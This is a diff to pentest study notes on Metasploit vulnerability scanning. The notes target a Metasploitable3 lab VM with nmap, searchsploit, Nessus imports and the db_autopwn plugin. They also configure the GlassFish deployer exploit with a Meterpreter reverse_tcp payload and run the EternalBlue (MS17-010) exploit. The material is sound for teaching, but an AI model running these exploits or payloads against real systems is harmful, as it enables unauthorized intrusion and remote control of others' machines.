@@ -553,7 +553,7 @@ set RHOSTS 192.41.167.3
 run
 ```
 
-### Services Enumeration
+### [Services Enumeration](https://www.offsec.com/metasploit-unleashed/service-identification/)
 
 > 📌🔬 Check the [Enumeration Section labs here](../assessment-methodologies/3-enumeration.md) for basic `nmap` enumeration.
 
@@ -682,7 +682,7 @@ run
 [+] 192.132.155.3:139 - IPC$ - (I) IPC Service (samba.recon.lab)
 ```
 
-> **`auxiliary/scanner/smb/smb_login`**
+> [**`auxiliary/scanner/smb/smb_login`**](https://www.offsec.com/metasploit-unleashed/smb-login-check/)
 
 ```bash
 back
@@ -1137,7 +1137,222 @@ run
 
 ## Vulnerability Scanning With MSF
 
+MSF **Auxiliary** and **exploit** modules can be utilized to identify inherent vulnerabilities in services, O.S. and web apps.
 
+- Useful in the **Exploitation** phase of the pentest
+
+[Metasploitable3](https://github.com/rapid7/metasploitable3) lab environment will be used for the vulnerability scanning demonstration.
+
+- **Metasploitable3** is a vulnerable virtual machine developed by Rapid7, intended to be used as a vulnerable target for testing exploits with Metasploit.
+
+> 🔬 You can find my the lab installation & configuration with Vagrant at [this page](https://blog.syselement.com/home/home-lab/redteam/metasploitable3), *set up for educational purposes*.
+
+- Kali Linux attacker machine must be configured with **the same local network** of the Metasploitable3 VMs.
+
+Detect active hosts on the local network, from the Kali VM:
+
+```bash
+sudo nmap -sn 192.168.31.0/24
+```
+
+```bash
+Nmap scan report for 192.168.31.139 # Linux target
+Nmap scan report for 192.168.31.140 # Windows2008 target
+```
+
+- Run Metasploit:
+
+```bash
+service postgresql start && msfconsole -q
+```
+
+```bash
+db_status
+setg RHOSTS 192.168.31.140
+setg RHOST 192.168.31.140
+workspace -a VULN_SCAN_MS3
+```
+
+- **Service version** is a key piece of information for the vulnerabilities scanning. Use the **`db_nmap`** command inside the MSF
+
+```bash
+db_nmap -sS -sV -O 192.168.31.140
+```
+
+```bash
+[*] Nmap: 21/tcp    open  ftp Microsoft ftpd
+[*] Nmap: 22/tcp    open  ssh OpenSSH 7.1 (protocol 2.0)
+[*] Nmap: 80/tcp    open  http Microsoft IIS httpd 7.5
+[*] Nmap: 135/tcp   open  msrpc Microsoft Windows RPC
+[*] Nmap: 139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+[*] Nmap: 3306/tcp  open  mysql MySQL 5.5.20-log
+[*] Nmap: 3389/tcp  open  tcpwrapped
+[*] Nmap: 4848/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
+[*] Nmap: 7676/tcp  open  java-message-service Java Message Service 301
+[*] Nmap: 8009/tcp  open  ajp13 Apache Jserv (Protocol v1.3)
+[*] Nmap: 8080/tcp  open  http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
+[*] Nmap: 8181/tcp  open  ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
+[*] Nmap: 8383/tcp  open  http Apache httpd
+[*] Nmap: 9200/tcp  open  wap-wsp?
+[*] Nmap: 49152/tcp open  msrpc Microsoft Windows RPC
+[*] Nmap: 49153/tcp open  msrpc Microsoft Windows RPC
+[*] Nmap: 49154/tcp open  msrpc Microsoft Windows RPC
+[*] Nmap: 49155/tcp open  msrpc Microsoft Windows RPC
+[...]
+```
+
+![db_nmap](.gitbook/assets/image-20230413200524969.png)
+
+```bash
+hosts
+services
+```
+
+- Manually search for a specific exploit
+  - Check if there are any exploits for a particular **version** of a service
+
+```bash
+search type:exploit name:iis
+```
+
+![search type:exploit name:iis](.gitbook/assets/image-20230413192845621.png)
+
+```bash
+search Sun GlassFish
+```
+
+- Check if a module will work on the specific version of the service
+
+```bash
+use exploit/multi/http/glassfish_deployer
+info
+
+# Description:
+#   This module logs in to a GlassFish Server (Open Source or
+#   Commercial) using various methods (such as authentication bypass,
+#   default credentials, or user-supplied login), and deploys a
+#   malicious war file in order to get remote code execution. It has
+#   been tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System
+#   Application Server 9.x. Newer GlassFish versions do not allow remote
+#   access (Secure Admin) by default, but is required for exploitation.
+```
+
+```bash
+set payload windows/meterpreter/reverse_tcp
+options
+# check the LHOST, LPORT, APP_RPORT, RPORT, PAYLOAD options
+```
+
+- Use [searchsploit](https://www.exploit-db.com/searchsploit) tool from the Kali terminal, instead of `search MSF command`, by displaying only the Metasploit exploit modules
+
+```bash
+searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
+```
+
+![](.gitbook/assets/image-20230413194606641.png)
+
+- Back in `msfconsole`, check if the server is vulnerable to MS17-010
+
+```bash
+search eternalblue
+use auxiliary/scanner/smb/smb_ms17_010
+run
+```
+
+![](.gitbook/assets/image-20230413200558380.png)
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+options
+# always check Payload options
+run
+```
+
+> [**metasploit-autopwn**](https://github.com/hahwul/metasploit-autopwn) - a Metasploit plugin for easy exploit & vulnerability attack.
+>
+> - *takes a look at the Metasploit database and provides a list of exploit modules to use for the already enumerated services* 
+
+- On a Kali terminal
+
+```bash
+wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
+sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
+```
+
+- On `msfconsole`
+
+```bash
+load db_autopwn
+```
+
+```bash
+db_autopwn -p -t
+# Enumerates exploits for each of the open ports
+```
+
+```bash
+db_autopwn -p -t -PI 445
+# Limit to only the 445 port
+```
+
+![db_autopwn -p -t -PI 445](.gitbook/assets/image-20230413202435550.png)
+
+- On `msfconsole` use the **`analyze`** command to auto analyze the contents of the MSFdb (hosts & services) 
+
+```
+analyze
+```
+
+![analyze](.gitbook/assets/image-20230413202708057.png)
+
+```bash
+vulns
+```
+
+![vulns](.gitbook/assets/image-20230413202802181.png)
+
+### VA with [Nessus](https://www.offsec.com/metasploit-unleashed/working-with-nessus/)
+
+> 🔬 You can find my [**Nessus Essentials** install tutorial here](https://blog.syselement.com/home/operating-systems-notes/linux/tools/nessus).
+
+- A vulnerability scan with Nessus result can be imported into the MSF for analysis and exploitation.
+- Nessus Essentials free version allows to scan up to 16 IPs.
+
+Start Nessus Essentials on the Kali VM, login and create a New **Basic Network Scan** and run it.
+
+Wait for the scan conclusion and export the results with the **Export/Nessus** button.
+
+ ![Nessus Essentials - Metasploitable3](.gitbook/assets/image-20230413222104319.png)
+
+- Open the `msfconsole` terminal and import the Nessus results
+  - Check the information from the scan results with the `hosts`, `services`, `vulns` commands
+
+```bash
+workspace -a MS3_NESSUS
+db_import /home/kali/Downloads/MS3_zph3t5.nessus
+hosts
+services
+vulns
+```
+
+![](.gitbook/assets/image-20230413222333897.png)
+
+```bash
+vulns -p 445
+```
+
+![](.gitbook/assets/image-20230413222411974.png)
+
+```bash
+search cve:2017 name:smb
+search MS12-020
+search cve:2019 name:rdp
+search cve:2015 name:ManageEngine
+search PHP CGI Argument Injection
+```
+
+### VA with [WMAP](https://www.offsec.com/metasploit-unleashed/wmap-web-scanner/)
 
 
 
